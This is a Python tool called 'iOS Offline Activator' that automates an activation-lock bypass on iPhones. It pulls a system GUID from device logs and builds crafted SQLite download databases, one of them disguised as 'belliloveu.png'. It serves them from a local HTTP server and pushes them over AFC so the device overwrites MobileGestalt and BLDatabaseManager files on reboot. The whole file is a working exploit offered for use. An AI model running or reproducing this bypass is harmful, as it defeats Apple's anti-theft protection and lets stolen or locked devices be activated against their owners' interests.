#!/usr/bin/env python3
"""
iOS Offline Activator - Cross-Platform Edition
Supports macOS and Linux - No external server required
"""
import sys
import os
import time
import subprocess
import re
import shutil
import sqlite3
import atexit
import socket
import threading
import zipfile
import tempfile
import binascii
import platform
from pathlib import Path
from http.server import SimpleHTTPRequestHandler
from socketserver import TCPServer

# --- CONFIGURATION & CONSTANTS ---

# SQL Template 1: BLDatabaseManager Structure
BL_STRUCTURE_SQL = """
PRAGMA foreign_keys=OFF;
BEGIN TRANSACTION;
CREATE TABLE ZBLDOWNLOADPOLICYINFO ( Z_PK INTEGER PRIMARY KEY, Z_ENT INTEGER, Z_OPT INTEGER, ZSTOREPLAYLISTIDENTIFIER INTEGER, ZPOLICYID VARCHAR, ZPOLICYDATA BLOB );
CREATE TABLE Z_PRIMARYKEY (Z_ENT INTEGER PRIMARY KEY, Z_NAME VARCHAR, Z_SUPER INTEGER, Z_MAX INTEGER);
INSERT INTO Z_PRIMARYKEY VALUES(1,'BLDownloadInfo',0,6);
INSERT INTO Z_PRIMARYKEY VALUES(2,'BLDownloadPolicyInfo',0,2);
CREATE TABLE Z_METADATA (Z_VERSION INTEGER PRIMARY KEY, Z_UUID VARCHAR(255), Z_PLIST BLOB);
INSERT INTO Z_METADATA VALUES(1,'2D3944E4-521A-43A6-AFF5-55A3E2A63841',X'62706c6973743030d80102030405060708090b0c0d0e0f14155f101e4e5353746f72654d6f64656c56657273696f6e4964656e746966696572735b4e5353746f7265547970655f10125f4e534175746f56616375756d4c6576656c5f101f4e5353746f72654d6f64656c56657273696f6e4861736865734469676573745f101e4e5353746f72654d6f64656c56657273696f6e436865636b73756d4b65795f10194e5353746f72654d6f64656c56657273696f6e4861736865735f101d4e5350657273697374656e63654672616d65776f726b56657273696f6e5f10204e5353746f72654d6f64656c56657273696f6e48617368657356657273696f6ea10a505653514c69746551325f10586d4a52623772585a664f6e6a7541714d504739695537424d4164766672543033797a7678344878636273307a34636e4b6f357a677262715149635542764c65527a524f506c79744249307a4a5772546b4e4639314f773d3d5f102c7671527a56456f3535615a6d6d433733355a63682b734c42336a4a6c6366314b4a4c476b456c79527a79513dd2101112135f1014424c446f776e6c6f6164506f6c696379496e666f5e424c446f776e6c6f6164496e666f4f102045bb929b5dd5da6fbca53674a37213713b95aef9df0c51c7085cc1e283f02f714f1020b42f3d26a27e7248429c9d5466fc52910c9b42055169caafcc2ec5e396c86f631105a7100300080019003a0046005b007d009e00ba00da00fd00ff01000107010901640193019801af01be01e1020402070000000000000201000000000000001600000000000000000000000000000209');
CREATE INDEX Z_BLDownloadInfo_byDownloadIDIndex ON ZBLDOWNLOADINFO (ZDOWNLOADID COLLATE BINARY ASC);
CREATE INDEX Z_BLDownloadInfo_byStateIndex ON ZBLDOWNLOADINFO (ZSTATE COLLATE BINARY ASC);
COMMIT;
"""

# SQL Template 2: Downloads Structure (with placeholders)
DOWNLOADS_STRUCTURE_SQL = """
PRAGMA foreign_keys=OFF;
BEGIN TRANSACTION;
CREATE TABLE asset (
    pid INTEGER,
    download_id INTEGER,
    asset_order INTEGER DEFAULT 0,
    asset_type TEXT,
    bytes_total INTEGER,
    url TEXT,
    local_path TEXT,
    destination_url TEXT,
    path_extension TEXT,
    retry_count INTEGER,
    http_method TEXT,
    initial_odr_size INTEGER,
    is_discretionary INTEGER DEFAULT 0,
    is_downloaded INTEGER DEFAULT 0,
    is_drm_free INTEGER DEFAULT 0,
    is_external INTEGER DEFAULT 0,
    is_hls INTEGER DEFAULT 0,
    is_local_cache_server INTEGER DEFAULT 0,
    is_zip_streamable INTEGER DEFAULT 0,
    processing_types INTEGER DEFAULT 0,
    video_dimensions TEXT,
    timeout_interval REAL,
    store_flavor TEXT,
    download_token INTEGER DEFAULT 0,
    blocked_reason INTEGER DEFAULT 0,
    avfoundation_blocked INTEGER DEFAULT 0,
    service_type INTEGER DEFAULT 0,
    protection_type INTEGER DEFAULT 0,
    store_download_key TEXT,
    etag TEXT,
    bytes_to_hash INTEGER,
    hash_type INTEGER DEFAULT 0,
    server_guid TEXT,
    file_protection TEXT,
    variant_id TEXT,
    hash_array BLOB,
    http_headers BLOB,
    request_parameters BLOB,
    body_data BLOB,
    body_data_file_path TEXT,
    sinfs_data BLOB,
    dpinfo_data BLOB,
    uncompressed_size INTEGER DEFAULT 0,
    url_session_task_id INTEGER DEFAULT -1,
    PRIMARY KEY (pid)
);
INSERT INTO asset VALUES(1,1,0,'media','https://google.com',NULL,'/private/var/mobile/Media/iTunes_Control/iTunes/iTunesMetadata.plist','plist',0,'GET',0,0,0,0,0,0,0,0,0,NULL,0.0,NULL,0,0,0,0,0,NULL,NULL,0,0,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,0,-1);
INSERT INTO asset VALUES(2,1,0,'media','https://google.com',NULL,'/private/var/containers/Shared/SystemGroup/GOODKEY/Documents/BLDatabaseManager/BLDatabaseManager.sqlite-wal','epub',0,'GET',0,0,0,0,0,0,0,0,0,NULL,0.0,NULL,0,0,0,0,0,NULL,NULL,0,0,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,0,-1);
INSERT INTO asset VALUES(3,1,0,'media','https://google.com',NULL,'/private/var/containers/Shared/SystemGroup/GOODKEY/Documents/BLDatabaseManager/BLDatabaseManager.sqlite-shm','epub',0,'GET',0,0,0,0,0,0,0,0,0,NULL,0.0,NULL,0,0,0,0,0,NULL,NULL,0,0,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,0,-1);
INSERT INTO asset VALUES(4,1,0,'media','https://google.com',NULL,'/private/var/containers/Shared/SystemGroup/GOODKEY/Documents/BLDatabaseManager/BLDatabaseManager.sqlite','epub',0,'GET',0,0,0,0,0,0,0,0,0,NULL,0.0,NULL,0,0,0,0,0,NULL,NULL,0,0,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,0,-1);
COMMIT;
"""

# --- CLASSES ---

class Style:
    RESET = '\033[0m'
    BOLD = '\033[1m'
    DIM = '\033[2m'
    RED = '\033[0;31m'
    GREEN = '\033[0;32m'
    YELLOW = '\033[1;33m'
    BLUE = '\033[0;34m'
    MAGENTA = '\033[0;35m'
    CYAN = '\033[0;36m'

class LocalServer:
    """
    Embedded HTTP server to serve the generated payloads to the device
    over the local network (Wi-Fi).
    """
    def __init__(self, port=8080):
        self.port = port
        self.serve_dir = tempfile.mkdtemp(prefix="ios_activation_")
        self.local_ip = self.get_local_ip()
        self.thread = None
        self.httpd = None

    def get_local_ip(self):
        """Attempts to find the LAN IP address."""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            # Connect to a public DNS server to determine outgoing interface IP
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return "127.0.0.1"

    def start(self):
        """Starts the HTTP server in a background thread."""
        os.chdir(self.serve_dir)
        handler = SimpleHTTPRequestHandler
        self.httpd = TCPServer(("", self.port), handler)
        self.thread = threading.Thread(target=self.httpd.serve_forever)
        self.thread.daemon = True
        self.thread.start()
        print(f"{Style.DIM}  ╰─▶ Local Server running at http://{self.local_ip}:{self.port} (Root: {self.serve_dir}){Style.RESET}")

    def stop(self):
        if self.httpd:
            self.httpd.shutdown()
            self.httpd.server_close()
        if os.path.exists(self.serve_dir):
            shutil.rmtree(self.serve_dir)

    def get_file_url(self, filename):
        return f"http://{self.local_ip}:{self.port}/{filename}"

class PayloadGenerator:
    """
    Generates the specialized SQLite databases required for the bypass.
    Originally logic from the PHP backend, now ported to Python.
    """
    def __init__(self, server_root, asset_root):
        self.server_root = Path(server_root)
        self.asset_root = Path(asset_root)

    def _create_db_from_sql(self, sql_content, output_path):
        try:
            # Handle 'unistr' format (Oracle to SQLite conversion for python)
            def unistr_sub(match):
                content = match.group(1)
                decoded = re.sub(r'\\([0-9A-Fa-f]{4})',
                               lambda m: binascii.unhexlify(m.group(1)).decode('utf-16-be'),
                               content)
                return f"'{decoded}'"

            sql_content = re.sub(r"unistr\s*\(\s*'([^']*)'\s*\)", unistr_sub, sql_content, flags=re.IGNORECASE)
            sql_content = re.sub(r"unistr\s*\(\s*('[^']*')\s*\)", r"\1", sql_content, flags=re.IGNORECASE)

            if output_path.exists(): output_path.unlink()

            conn = sqlite3.connect(str(output_path))
            cursor = conn.cursor()
            cursor.executescript(sql_content)
            conn.commit()
            conn.close()
            return True
        except Exception as e:
            print(f"{Style.RED}DB Gen Error: {e}{Style.RESET}")
            return False

    def generate(self, prd, guid, sn, local_server):
        # Normalize Product ID
        prd_safe = prd.replace(',', '-')

        # 1. Locate MobileGestalt
        plist_path = self.asset_root / "assets" / "Maker" / prd_safe / "com.apple.MobileGestalt.plist"
        if not plist_path.exists():
            print(f"{Style.RED}[✗] Asset missing: {plist_path}{Style.RESET}")
            return None

        # 2. Create 'fixedfile' (Zipped Plist)
        token1 = binascii.hexlify(os.urandom(8)).decode()
        zip_name = f"payload_{token1}.zip"
        zip_path = self.server_root / zip_name

        with zipfile.ZipFile(str(zip_path), 'w') as zf:
            zf.write(str(plist_path), "Caches/com.apple.MobileGestalt.plist")

        fixedfile_name = f"fixedfile_{token1}"
        fixedfile_path = self.server_root / fixedfile_name
        zip_path.rename(fixedfile_path)
        fixedfile_url = local_server.get_file_url(fixedfile_name)

        # 3. Create BLDatabase (belliloveu.png)
        bl_sql = BL_STRUCTURE_SQL.replace('KEYOOOOOO', fixedfile_url)

        token2 = binascii.hexlify(os.urandom(8)).decode()
        bl_db_name = f"belliloveu_{token2}.png"
        bl_db_path = self.server_root / bl_db_name

        if not self._create_db_from_sql(bl_sql, bl_db_path): return None
        bl_url = local_server.get_file_url(bl_db_name)

        # 4. Create Final Downloads DB
        dl_sql = DOWNLOADS_STRUCTURE_SQL.replace('https://google.com', bl_url)
        dl_sql = dl_sql.replace('GOODKEY', guid)

        token3 = binascii.hexlify(os.urandom(8)).decode()
        final_db_name = f"downloads_{token3}.sqlitedb"
        final_db_path = self.server_root / final_db_name

        if not self._create_db_from_sql(dl_sql, final_db_path): return None

        return final_db_path

class BypassAutomation:
    def __init__(self):
        self.timeouts = {'asset_wait': 300, 'asset_delete_delay': 15, 'reboot_wait': 300, 'syslog_collect': 180}
        self.mount_point = Path.home() / f".ifuse_mount_{os.getpid()}"
        self.afc_mode = None
        self.device_info = {}
        self.guid = None
        self.platform = platform.system().lower()

        # Server Components
        self.server = LocalServer()
        self.generator = PayloadGenerator(self.server.serve_dir, Path.cwd())

        atexit.register(self._cleanup)

    def clear_screen(self):
        """Cross-platform screen clear"""
        if os.name == 'nt':
            os.system('cls')
        else:
            os.system('clear')

    def log(self, msg, level='info'):
        if level == 'info': print(f"{Style.GREEN}[✓]{Style.RESET} {msg}")
        elif level == 'error': print(f"{Style.RED}[✗]{Style.RESET} {msg}")
        elif level == 'warn': print(f"{Style.YELLOW}[⚠]{Style.RESET} {msg}")
        elif level == 'step':
            print(f"\n{Style.BOLD}{Style.CYAN}" + "━" * 40 + f"{Style.RESET}")
            print(f"{Style.BOLD}{Style.BLUE}▶{Style.RESET} {Style.BOLD}{msg}{Style.RESET}")
            print(f"{Style.CYAN}" + "━" * 40 + f"{Style.RESET}")
        elif level == 'detail': print(f"{Style.DIM}  ╰─▶{Style.RESET} {msg}")
        elif level == 'success': print(f"{Style.GREEN}{Style.BOLD}[✓ SUCCESS]{Style.RESET} {msg}")

    def _run_cmd(self, cmd, timeout=None):
        try:
            res = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
            return res.returncode, res.stdout.strip(), res.stderr.strip()
        except subprocess.TimeoutExpired: return 124, "", "Timeout"
        except Exception as e: return 1, "", str(e)

    def verify_dependencies(self):
        self.log("Verifying System Requirements...", "step")
        self.log(f"Platform: {self.platform}", "detail")

        # Check for assets/Maker
        assets_path = Path.cwd() / "assets" / "Maker"
        if not assets_path.is_dir():
            self.log(f"Missing 'assets/Maker' folder in current directory.", "error")
            sys.exit(1)

        # Check for required tools
        required = ["pymobiledevice3", "ideviceinfo"]
        for tool in required:
            if not shutil.which(tool):
                self.log(f"Missing required tool: {tool}", "error")
                sys.exit(1)

        if shutil.which("ifuse"):
            self.afc_mode = "ifuse"
        else:
            self.afc_mode = "pymobiledevice3"
        self.log(f"AFC Transfer Mode: {self.afc_mode}", "info")

    def mount_afc(self):
        if self.afc_mode != "ifuse": return True
        self.mount_point.mkdir(parents=True, exist_ok=True)
        code, out, _ = self._run_cmd(["mount"])
        if str(self.mount_point) in out: return True
        for i in range(5):
            if self._run_cmd(["ifuse", str(self.mount_point)])[0] == 0: return True
            time.sleep(2)
        return False

    def unmount_afc(self):
        if self.afc_mode == "ifuse" and self.mount_point.exists():
            self._run_cmd(["umount", str(self.mount_point)])
            try: self.mount_point.rmdir()
            except: pass

    def detect_device(self):
        self.log("Detecting Device...", "step")
        code, out, _ = self._run_cmd(["ideviceinfo"])
        if code != 0:
            self.log("No device found via USB", "error")
            sys.exit(1)

        info = {}
        for line in out.splitlines():
            if ": " in line:
                key, val = line.split(": ", 1)
                info[key.strip()] = val.strip()
        self.device_info = info

        print(f"\n{Style.BOLD}Device: {info.get('ProductType','Unknown')} (iOS {info.get('ProductVersion','?')}){Style.RESET}")
        print(f"UDID: {info.get('UniqueDeviceID','?')}")

        if info.get('ActivationState') == 'Activated':
            print(f"{Style.YELLOW}Warning: Device already activated.{Style.RESET}")

    def get_guid_macos(self, log_path):
        """macOS-specific: Use /usr/bin/log to parse logarchive"""
        tmp = Path("final.logarchive")
        if tmp.exists(): shutil.rmtree(tmp)
        shutil.move(str(log_path), str(tmp))
        _, logs, _ = self._run_cmd(["/usr/bin/log", "show", "--style", "syslog", "--archive", str(tmp)])
        shutil.rmtree(tmp)
        return logs

    def get_guid_linux(self):
        """Linux-specific: Use live syslog watch to capture GUID"""
        self.log("Using live syslog watch (Linux mode)...", "detail")

        try:
            proc = subprocess.Popen(
                ["pymobiledevice3", "syslog", "live"],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )

            guid_pattern = re.compile(r'SystemGroup/([0-9A-Fa-f]{8}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{12})/')
            start_time = time.time()
            timeout = self.timeouts['syslog_collect']

            self.log(f"Watching syslog for up to {timeout}s...", "detail")

            while time.time() - start_time < timeout:
                line = proc.stdout.readline()
                if not line:
                    time.sleep(0.1)
                    continue

                if "BLDatabaseManager" in line:
                    match = guid_pattern.search(line)
                    if match:
                        proc.terminate()
                        return match.group(1).upper()

            proc.terminate()
            return None

        except Exception as e:
            self.log(f"Syslog watch error: {e}", "warn")
            return None

    def get_guid(self):
        self.log("Extracting System Logs...", "step")
        udid = self.device_info['UniqueDeviceID']
        log_path = Path(f"{udid}.logarchive")
        if log_path.exists(): shutil.rmtree(log_path)

        guid_pattern = re.compile(r'SystemGroup/([0-9A-Fa-f]{8}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{12})/')

        # Try collect method first (works on macOS with /usr/bin/log)
        if self.platform == 'darwin':
            self._run_cmd(["pymobiledevice3", "syslog", "collect", str(log_path)], timeout=180)

            if log_path.exists():
                logs = self.get_guid_macos(log_path)
                for line in logs.splitlines():
                    if "BLDatabaseManager" in line:
                        match = guid_pattern.search(line)
                        if match: return match.group(1).upper()

                # Fallback to live watch
                self.log("Archive parse failed, trying live watch...", "warn")

        # Linux or macOS fallback: use live syslog watch
        return self.get_guid_linux()

    def run(self):
        self.clear_screen()
        print(f"{Style.BOLD}{Style.MAGENTA}iOS Offline Activator - Cross-Platform Edition{Style.RESET}")
        print(f"{Style.DIM}Platform: {self.platform}{Style.RESET}\n")

        self.verify_dependencies()
        self.server.start()
        self.detect_device()

        input(f"{Style.YELLOW}Press Enter to start...{Style.RESET}")

        # 1. Reboot
        self.log("Rebooting device...", "step")
        self._run_cmd(["pymobiledevice3", "diagnostics", "restart"])
        time.sleep(30)

        # 2. Get GUID
        self.guid = self.get_guid()
        if not self.guid:
            self.log("Could not find GUID in logs.", "error")
            sys.exit(1)
        self.log(f"GUID: {self.guid}", "success")

        # 3. Generate Payloads (Offline Logic)
        self.log("Generating Payload (Offline)...", "step")
        final_db_path = self.generator.generate(
            self.device_info['ProductType'],
            self.guid,
            self.device_info['SerialNumber'],
            self.server
        )

        if not final_db_path:
            self.log("Payload generation failed.", "error")
            sys.exit(1)
        self.log("Payload Generated Successfully.", "success")

        # 4. Upload
        self.log("Uploading...", "step")
        target = "/Downloads/downloads.28.sqlitedb"

        if self.afc_mode == "ifuse":
            self.mount_afc()
            fpath = self.mount_point / "Downloads" / "downloads.28.sqlitedb"
            if fpath.exists(): fpath.unlink()
            shutil.copy(str(final_db_path), str(fpath))
        else:
            self._run_cmd(["pymobiledevice3", "afc", "rm", target])
            self._run_cmd(["pymobiledevice3", "afc", "push", str(final_db_path), target])

        self.log("Payload Deployed. Rebooting...", "success")
        self._run_cmd(["pymobiledevice3", "diagnostics", "restart"])

        print(f"\n{Style.GREEN}Process Complete. Device should activate after reboot.{Style.RESET}")

        # Keep script alive for server to serve files
        self.log("Keeping server alive for 60s to ensure downloads complete...", "info")
        time.sleep(60)

        self._cleanup()

    def _cleanup(self):
        self.unmount_afc()
        self.server.stop()

if __name__ == "__main__":
    try:
        BypassAutomation().run()
    except KeyboardInterrupt:
        sys.exit(130)
    except Exception as e:
        print(f"Fatal Error: {e}")
        sys.exit(1)
